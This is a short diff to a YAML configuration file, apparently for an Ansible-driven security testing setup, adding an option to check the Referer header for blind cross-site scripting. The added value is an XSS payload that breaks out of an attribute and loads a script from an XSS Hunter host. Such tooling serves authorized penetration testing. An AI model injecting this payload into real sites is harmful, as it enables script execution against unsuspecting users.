@@ -19,3 +19,8 @@ destroy_rebuild: true
 
 # Ansible playbook bin location
 ansible_playbook_bin: '/usr/local/bin/ansible-playbook'
+
+# Use XSSHunter to check for Blind XSS in the Referer header
+referer_blind_xss: 'false'
+# XSSHunter script to use
+xss_hunter_script: '\"><script src=https://yourusername.xss.ht></script>'
